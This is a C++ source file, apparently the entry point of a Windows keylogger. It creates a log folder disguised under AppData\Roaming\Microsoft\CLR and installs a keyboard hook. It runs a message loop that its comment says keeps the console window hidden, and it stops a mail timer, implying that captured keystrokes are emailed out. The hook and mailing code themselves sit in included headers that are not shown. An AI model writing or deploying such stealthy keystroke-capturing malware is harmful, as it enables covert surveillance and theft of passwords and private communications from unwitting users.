//
// Created by Ahsan Ghani on 2022-09-15.
//
#include "IO.h"
#include "base64.h"
#include "helper.h"
#include "keybhook.h"
#include "keyconstants.h"
#include "sendmail.h"
#include "timer.h"
#include <iostream>
#include <windows.h>

using namespace std;

int main() {
  MSG Msg;
  // creates the log file at: C:\Users\[USERNAME]\AppData\Roaming\Microsoft\CLR
  IO::MKDir(IO::GetOurPath(true));
  InstallHook();

  // this section prevents the console window from appearing when the
  // application is started from the bin\debug\ folders however if you run it on
  // CodeBlocks the console window will still appear, because that's just
  // CodeBlocks functionality
  while (GetMessage(&Msg, NULL, 0, 0)) {
    TranslateMessage(&Msg);
    DispatchMessage(&Msg);
  }

  MailTimer.Stop();
  return 0;
}